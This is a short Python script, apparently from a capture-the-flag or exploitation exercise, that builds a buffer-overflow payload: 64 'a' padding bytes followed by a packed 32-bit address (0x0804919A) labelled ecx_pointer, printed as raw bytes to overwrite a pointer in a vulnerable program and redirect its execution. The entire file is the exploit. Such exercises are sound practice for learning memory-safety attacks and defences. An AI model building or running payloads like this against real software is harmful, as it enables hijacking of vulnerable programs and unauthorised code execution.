import struct

string = ''
for i in range(64):
    string = string + 'a'

ecx_pointer = struct.pack("I", 0x0804919A)

print(string.encode('utf-8') + ecx_pointer)
